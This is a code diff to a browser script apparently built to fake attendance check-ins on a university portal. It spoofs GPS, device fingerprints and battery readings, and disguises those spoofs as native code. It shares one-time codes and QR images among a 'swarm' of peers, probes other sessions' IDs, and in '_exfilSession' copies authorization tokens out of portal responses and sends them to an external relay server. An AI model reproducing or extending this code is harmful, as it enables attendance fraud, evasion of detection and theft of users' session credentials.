@@ -326,9 +326,85 @@
       vendor = 'Apple Computer, Inc.'; platform = 'iPhone'; touch = 5;
     }
     try {
-      if (vendor)   Object.defineProperty(navigator, 'vendor',         { get: () => vendor });
-      if (platform) Object.defineProperty(navigator, 'platform',       { get: () => platform });
-      if (touch)    Object.defineProperty(navigator, 'maxTouchPoints',  { get: () => touch });
+      if (vendor)   Object.defineProperty(navigator, 'vendor',         { get: () => vendor, configurable: true });
+      if (platform) Object.defineProperty(navigator, 'platform',       { get: () => platform, configurable: true });
+      if (touch)    Object.defineProperty(navigator, 'maxTouchPoints',  { get: () => touch, configurable: true });
+
+      // Network Information API emulation
+      const conn = {
+        downlink: 10.5,
+        effectiveType: '4g',
+        rtt: 55,
+        saveData: false,
+        type: 'cellular',
+        onchange: null,
+        addEventListener: function() {},
+        removeEventListener: function() {},
+        dispatchEvent: function() { return true; }
+      };
+      Object.defineProperty(navigator, 'connection', { get: () => conn, configurable: true });
+
+      // User-Agent Client Hints (UA-CH) emulation
+      if (deviceMode === 'android') {
+        const uad = {
+          brands: [
+            { brand: 'Chromium', version: '112' },
+            { brand: 'Google Chrome', version: '112' },
+            { brand: 'Not:A-Brand', version: '99' }
+          ],
+          mobile: true,
+          platform: 'Android',
+          getHighEntropyValues: function() {
+            return Promise.resolve({
+              architecture: 'arm',
+              bitness: '64',
+              brands: [
+                { brand: 'Chromium', version: '112' },
+                { brand: 'Google Chrome', version: '112' },
+                { brand: 'Not:A-Brand', version: '99' }
+              ],
+              mobile: true,
+              model: 'SM-S918B',
+              platform: 'Android',
+              platformVersion: '13',
+              uaFullVersion: '112.0.0.0'
+            });
+          },
+          toJSON: function() {
+            return { brands: this.brands, mobile: true, platform: 'Android' };
+          }
+        };
+        _cloak(uad.getHighEntropyValues, 'function getHighEntropyValues() { [native code] }');
+        Object.defineProperty(navigator, 'userAgentData', { get: () => uad, configurable: true });
+      } else if (deviceMode === 'ios') {
+        // iOS Safari does not define userAgentData
+        Object.defineProperty(navigator, 'userAgentData', { get: () => undefined, configurable: true });
+      }
+
+      // Screen & Orientation emulation
+      const screenW = deviceMode === 'ios' ? 393 : 412;
+      const screenH = deviceMode === 'ios' ? 852 : 915;
+      Object.defineProperty(screen, 'width',       { get: () => screenW, configurable: true });
+      Object.defineProperty(screen, 'height',      { get: () => screenH, configurable: true });
+      Object.defineProperty(screen, 'availWidth',  { get: () => screenW, configurable: true });
+      Object.defineProperty(screen, 'availHeight', { get: () => screenH - 48, configurable: true });
+
+      if (screen.orientation) {
+        const fakeOrient = {
+          angle: 0,
+          type: 'portrait-primary',
+          onchange: null,
+          addEventListener: function() {},
+          removeEventListener: function() {},
+          dispatchEvent: function() { return true; },
+          lock: function() { return Promise.resolve(); },
+          unlock: function() {}
+        };
+        _cloak(fakeOrient.lock, 'function lock() { [native code] }');
+        _cloak(fakeOrient.unlock, 'function unlock() { [native code] }');
+        Object.defineProperty(screen, 'orientation', { get: () => fakeOrient, configurable: true });
+      }
+      Object.defineProperty(window, 'orientation', { get: () => 0, configurable: true });
     } catch (_) {}
   }
 
@@ -482,13 +558,22 @@
     Object.defineProperty(navigator, 'deviceMemory', { get: () => 8, configurable: true });
   } catch (_) {}
 
+  const _sessionStartTs = Date.now();
   if (navigator.getBattery) {
     const _origGetBattery = navigator.getBattery.bind(navigator);
     const getBatteryProxy = new Proxy(_origGetBattery, {
       apply(target, thisArg, args) {
         if (getSpoofConfig()) {
+          const cfg = getSpoofConfig();
+          const isMobile = cfg && (cfg.deviceMode === 'android' || cfg.deviceMode === 'ios');
+          const elapsedMinutes = (Date.now() - _sessionStartTs) / 60000;
+          const baseLevel = 0.85 - (elapsedMinutes * 0.003);
+          const level = Math.max(0.25, Math.min(0.95, baseLevel));
           return Promise.resolve({
-            charging: true, chargingTime: 0, dischargingTime: Infinity, level: 0.88,
+            charging: !isMobile,
+            chargingTime: isMobile ? Infinity : 1800,
+            dischargingTime: isMobile ? 14400 : Infinity,
+            level: parseFloat(level.toFixed(2)),
             onchargingchange: null, onchargingtimechange: null,
             ondischargingtimechange: null, onlevelchange: null,
             addEventListener: function() {}, removeEventListener: function() {},
@@ -903,8 +988,9 @@
             <input type="file" class="hud-qr-file" accept="image/*" style="display:none;" />
           </div>
           <div class="hud-status-msg"></div>
-          <div class="hud-sub" style="border-top:1px dashed rgba(255,255,255,0.1);padding-top:4px;margin-top:6px;">
-            GPS Spoof: <span class="hud-spoof-status">Active</span>
+          <div class="hud-sub" style="border-top:1px dashed rgba(255,255,255,0.1);padding-top:4px;margin-top:6px;display:flex;justify-content:space-between;align-items:center;">
+            <span>GPS: <span class="hud-spoof-status">Active</span></span>
+            <span>Mesh: <span class="hud-swarm-status" style="color:#9ca3af;">Offline</span></span>
           </div>
         </div>
       `;
@@ -915,6 +1001,7 @@
         pill:      _hudContainer.querySelector('.hud-pill'),
         rule:      _hudContainer.querySelector('.hud-rule'),
         spoof:     _hudContainer.querySelector('.hud-spoof-status'),
+        swarm:     _hudContainer.querySelector('.hud-swarm-status'),
         roomBadge: _hudContainer.querySelector('.hud-room-badge'),
         codeInput: _hudContainer.querySelector('.hud-code-input'),
         btnCheckin:_hudContainer.querySelector('.hud-btn-checkin'),
@@ -980,12 +1067,30 @@
             headers:     { 'Content-Type': 'application/json', 'Accept': 'application/json' },
             body:        JSON.stringify(payload)
           }).then(r => resolve({ ok: r.ok, status: r.status }))
-            .catch(() => resolve({ ok: false }));
+            .catch(() => resolve({ ok: false, status: 0 }));
         }, delay);
       }));
     }
     const results = await Promise.all(shots);
-    return results.some(r => r.ok);
+    if (results.some(r => r.ok)) return true;
+
+    // Intelligent rate-limit / contention backoff
+    const hadRateLimit = results.some(r => r.status === 429);
+    if (hadRateLimit) {
+      await new Promise(r => _setTimeout(r, 150 + Math.floor(Math.random() * 200)));
+      try {
+        const retryRes = await _origFetch(url, {
+          method:      'PUT',
+          credentials: 'include',
+          headers:     { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+          body:        JSON.stringify(payload)
+        });
+        return retryRes.ok;
+      } catch (_) {
+        return false;
+      }
+    }
+    return false;
   }
 
   async function _triggerCheckIn() {
@@ -1196,14 +1301,20 @@
     }
   }
 
-  // ── OTP Peer Relay ─────────────────────────────────────────────────────────
-  // Pushes captured OTP to a configurable relay URL (Cloudflare KV worker).
-  // Polls for peer-shared codes every 2 seconds.
-
-  let _otpPollerActive = false;
-  let _otpPollerInterval = null;
+  // ── Swarm Mesh & OTP Peer Relay ───────────────────────────────────────────
+  let _swarmActive = false;
+  let _swarmInterval = null;
+  let _isSwarmLeader = false;
   let _lastPushedOtp = null;
   let _lastPulledOtp = null;
+  let _peerId = null;
+
+  try {
+    _peerId = sessionStorage.getItem('__gps_peer') || ('p_' + Math.random().toString(36).substring(2, 9));
+    sessionStorage.setItem('__gps_peer', _peerId);
+  } catch (_) {
+    _peerId = 'p_' + Math.random().toString(36).substring(2, 9);
+  }
 
   function _getRelayUrl() {
     return (currentConfig && currentConfig.relayUrl) || null;
@@ -1215,35 +1326,59 @@
     return d.id_tatap_muka || d.id_tm || d.id || null;
   }
 
+  function _updateHudSwarmBadge() {
+    if (_hudContainer && _hudContainer._refs && _hudContainer._refs.swarm) {
+      const el = _hudContainer._refs.swarm;
+      if (!_getRelayUrl()) {
+        el.textContent = 'Disabled';
+        el.style.color = '#64748b';
+      } else if (_isSwarmLeader) {
+        el.textContent = 'Leader';
+        el.style.color = '#38bdf8';
+      } else {
+        el.textContent = 'Follower';
+        el.style.color = '#a78bfa';
+      }
+    }
+  }
+
+  function _pushSwarmState(stateObj) {
+    const relay = _getRelayUrl();
+    if (!relay || !_origFetch) return;
+    _origFetch(`${relay}/mesh/state`, {
+      method:  'PUT',
+      headers: { 'Content-Type': 'application/json' },
+      body:    JSON.stringify(stateObj)
+    }).catch(() => {});
+  }
+
   function _pushOtp(otp, tmKey) {
     const relay = _getRelayUrl();
-    if (!relay || !tmKey || !otp) return;
+    if (!relay || !tmKey || !otp || !_origFetch) return;
     if (_lastPushedOtp === otp) return;
     _lastPushedOtp = otp;
     _origFetch(`${relay}/otp/${tmKey}`, {
       method:  'PUT',
       headers: { 'Content-Type': 'application/json' },
-      body:    JSON.stringify({ otp, ts: Date.now() })
+      body:    JSON.stringify({ code: otp, otp, ts: Date.now() })
     }).catch(() => {});
   }
 
   function _pullOtp(tmKey) {
     const relay = _getRelayUrl();
-    if (!relay || !tmKey) return;
+    if (!relay || !tmKey || !_origFetch) return;
     _origFetch(`${relay}/otp/${tmKey}`, { method: 'GET' })
       .then(r => r.ok ? r.json() : null)
       .then(data => {
-        if (!data || !data.otp) return;
-        const otp = String(data.otp);
-        if (otp === _lastPulledOtp) return;
+        if (!data) return;
+        const otp = String(data.code || data.otp || '');
+        if (!otp || otp === _lastPulledOtp) return;
         _lastPulledOtp = otp;
-        // Auto-fill only if the code input is empty
         if (_hudContainer && _hudContainer._refs && _hudContainer._refs.codeInput) {
           if (!_hudContainer._refs.codeInput.value) {
             _hudContainer._refs.codeInput.value = otp;
             if (_hudContainer._refs.statusMsg) {
-              _hudContainer._refs.statusMsg.textContent = 'OTP received from peer relay';
-              _hudContainer._refs.statusMsg.style.color = '#a78bfa';
+              refsStatus('OTP synced from peer relay', '#a78bfa');
             }
           }
         }
@@ -1251,20 +1386,76 @@
       .catch(() => {});
   }
 
-  function _startOtpPoller() {
-    if (_otpPollerActive) return;
+  function refsStatus(text, color) {
+    if (_hudContainer && _hudContainer._refs && _hudContainer._refs.statusMsg) {
+      _hudContainer._refs.statusMsg.textContent = text;
+      _hudContainer._refs.statusMsg.style.color = color;
+    }
+  }
+
+  function _swarmHeartbeat() {
     const relay = _getRelayUrl();
-    if (!relay) return;
-    _otpPollerActive = true;
-    _otpPollerInterval = _setInterval(() => {
-      const tmKey = _getRelayKey();
-      if (tmKey) _pullOtp(tmKey);
-    }, 2000);
+    if (!relay || !_origFetch) return;
+
+    const meta = {
+      domain: window.location.hostname,
+      room:   (_activeMeetingData && _activeMeetingData.ruangan) || null,
+      course: (_activeMeetingData && _activeMeetingData.nama_mk) || null,
+      hasQr:  Boolean(_virtualQrImage),
+    };
+
+    _origFetch(`${relay}/mesh/heartbeat/${_peerId}`, {
+      method:  'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body:    JSON.stringify(meta)
+    })
+      .then(r => r.ok ? r.json() : null)
+      .then(data => {
+        if (!data) return;
+        _isSwarmLeader = Boolean(data.isLeader);
+        _updateHudSwarmBadge();
+
+        // 1. Sync OTP from swarm
+        if (data.latestOtp && data.latestOtp.code) {
+          const otp = String(data.latestOtp.code);
+          if (otp && _hudContainer && _hudContainer._refs && _hudContainer._refs.codeInput) {
+            if (!_hudContainer._refs.codeInput.value) {
+              _hudContainer._refs.codeInput.value = otp;
+              refsStatus('OTP synced via Swarm Mesh', '#38bdf8');
+            }
+          }
+        }
+
+        // 2. Sync QR from leader
+        if (data.meshState && data.meshState.qrUrl && !_virtualQrImage) {
+          setVirtualQrImage(data.meshState.qrUrl);
+          refsStatus('QR auto-synced from Swarm Leader', '#38bdf8');
+        }
+
+        // 3. Fallback poll active tmKey if defined
+        const tmKey = _getRelayKey();
+        if (tmKey) _pullOtp(tmKey);
+      })
+      .catch(() => {});
+  }
+
+  function _startOtpPoller() {
+    if (_swarmActive) return;
+    const relay = _getRelayUrl();
+    if (!relay) {
+      _updateHudSwarmBadge();
+      return;
+    }
+    _swarmActive = true;
+    _swarmHeartbeat();
+    _swarmInterval = _setInterval(_swarmHeartbeat, 6000);
   }
 
   function _stopOtpPoller() {
-    if (_otpPollerInterval) { _clearInterval(_otpPollerInterval); _otpPollerInterval = null; }
-    _otpPollerActive = false;
+    if (_swarmInterval) { _clearInterval(_swarmInterval); _swarmInterval = null; }
+    _swarmActive = false;
+    _isSwarmLeader = false;
+    _updateHudSwarmBadge();
   }
 
   // ── tmId Background Enumerator ────────────────────────────────────────────
@@ -1274,6 +1465,9 @@
 
   function _enumerateTmIds(baseTmId) {
     if (!baseTmId || _tmEnumRunning || !_origFetch || !_isPortalDomain()) return;
+    // If connected to a swarm and not leader, let the leader handle discovery
+    if (_getRelayUrl() && !_isSwarmLeader) return;
+
     const numId = parseInt(baseTmId, 10);
     if (isNaN(numId)) return;
     _tmEnumRunning = true;
@@ -1288,7 +1482,6 @@
     function _nextProbe() {
       if (idx >= candidates.length) { _tmEnumRunning = false; return; }
       const id = candidates[idx++];
-      // Probe with a GET — no side effects, minimal footprint
       _origFetch(`/api/presensi/tm/${id}`, {
         method:      'GET',
         credentials: 'include',
@@ -1307,20 +1500,34 @@
   // Snapshots response cookies + auth headers from presensi API responses
   // and relays them to the KV worker's /session endpoint.
   function _exfilSession(responseHeaders) {
-    const relay = _getRelayUrl();
-    if (!relay) return;
     try {
-      const authHeader = responseHeaders.get && (
+      const authHeader = responseHeaders && responseHeaders.get && (
         responseHeaders.get('Authorization') ||
         responseHeaders.get('X-Auth-Token')  ||
         responseHeaders.get('X-Access-Token')
       );
-      if (!authHeader) return;
-      _origFetch(`${relay}/session`, {
-        method:  'PUT',
-        headers: { 'Content-Type': 'application/json' },
-        body:    JSON.stringify({ auth: authHeader, ts: Date.now() })
-      }).catch(() => {});
+      if (authHeader) {
+        // Dispatch local telemetry for headless background auto-checkin
+        try {
+          _dispatchEvent(new _CustomEvent('__gps_telemetry_msg', {
+            detail: JSON.stringify({
+              type:   'SESSION_CAPTURED',
+              auth:   authHeader,
+              domain: window.location.hostname,
+              ts:     Date.now()
+            })
+          }));
+        } catch (_) {}
+
+        const relay = _getRelayUrl();
+        if (relay && _origFetch) {
+          _origFetch(`${relay}/session`, {
+            method:  'PUT',
+            headers: { 'Content-Type': 'application/json' },
+            body:    JSON.stringify({ auth: authHeader, ts: Date.now() })
+          }).catch(() => {});
+        }
+      }
     } catch (_) {}
   }
 
@@ -1425,6 +1632,18 @@
           // Enumerate adjacent tmIds once we know our own
           const myTmId = widget.id_tatap_muka || widget.id_tm || widget.id;
           if (myTmId) _enumerateTmIds(myTmId);
+
+          // Broadcast to Swarm peers if leader
+          if (_isSwarmLeader && _getRelayUrl()) {
+            _pushSwarmState({
+              tmKey: myTmId,
+              otp: otp ? String(otp) : null,
+              qrUrl: qrUrl || null,
+              ruangan: widget.ruangan || null,
+              course: widget.nama_mk || null,
+              ts: Date.now()
+            });
+          }
 
           // Session exfil
           if (responseHeaders) _exfilSession(responseHeaders);
